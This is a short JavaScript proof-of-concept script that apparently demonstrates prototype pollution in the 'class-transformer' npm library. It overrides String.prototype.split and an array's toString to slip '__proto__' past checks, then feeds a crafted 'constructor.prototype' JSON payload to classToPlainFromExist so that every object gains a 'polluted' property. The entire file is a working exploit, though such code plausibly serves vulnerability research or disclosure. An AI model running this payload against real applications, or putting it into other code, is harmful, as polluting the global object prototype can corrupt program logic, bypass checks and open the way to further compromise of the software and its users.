var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const root = require('class-transformer');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
root.classToPlainFromExist(payload, {});
console.log({}.polluted);